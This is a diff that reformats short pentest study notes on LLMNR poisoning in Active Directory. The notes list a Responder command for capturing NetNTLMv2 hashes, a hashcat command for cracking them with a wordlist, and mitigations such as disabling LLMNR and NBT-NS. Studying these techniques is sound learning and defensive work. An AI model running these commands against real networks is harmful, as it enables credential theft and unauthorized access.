@@ -1,17 +1,17 @@
 
 <h1>Initial Attack AD</h1>
-- LLMNR(link local multi-name resolution)
+<h3>LLMNR(link local multi-name resolution)</h3>
 	- executes when dns fails
 	
-	**Step1: Run responder**
-	- python Responder.py -I tun0 -rdwv
-	**Step2: An event occurs**
-	**Step3:Get dem hashes**
-	**Step4: Crack Dem hashes**
-		- hashcat -m 5600 hashes.txt rockyou.txt
-	Mitigations
-		disable llmnr
-		disable nbt-ns
+	<b>Step 1: Run responder</b>
+	  <em>python Responder.py -I tun0 -rdwv</em>
+	<b>Step 2: An event occurs</b>
+	<b>Step 3:Get dem hashes</b>
+	<b>Step 4: Crack Dem hashes</b>
+	  <em>hashcat -m 5600 hashes.txt rockyou.txt</em>
+	<u>Mitigations</u>
+	  <em>disable llmnr</em>
+	  <em>disable nbt-ns</em>
 		cant disable llmnr/nbt-ns
 			require network access control
 			require strong user password
